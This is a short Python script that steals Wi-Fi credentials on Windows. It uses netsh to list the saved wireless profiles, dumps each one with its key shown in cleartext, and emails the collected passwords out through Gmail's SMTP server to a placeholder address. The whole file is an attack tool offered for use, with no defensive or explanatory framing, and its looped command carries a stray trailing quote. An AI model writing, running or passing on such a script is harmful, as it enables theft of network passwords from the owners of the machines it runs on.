import subprocess
import smtplib
import re;

def send_mail(email, password, message):
    # Use the correct SMTP server for Gmail
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()  # Start TLS encryption
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

try:
    # Correct the command syntax to use single quotes or escape the internal quotes
#    command = 'netsh wlan show profile name="BSNL 5G NET" key=clear'
    command = 'netsh wlan show profile'
    networks = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)  # Capture output and errors
    decoded_result = networks.decode('utf-8')  # Decode bytes to string
    network_name_list= re.findall("(?:Profile\s*:\s)(.*)",decoded_result)
    result = ""
    for network_name in network_name_list:
        command = 'netsh wlan show profile name="'+network_name+'" key=clear"'
        current_result=subprocess.check_output(command,shell=True)
        decoded_result = current_result.decode('utf-8')
        result=result+ decoded_result
    send_mail("<your mail id>", "<your pass>", result)

except subprocess.CalledProcessError as e:
    print(f"Command failed with error: {e.output.decode('utf-8')}")
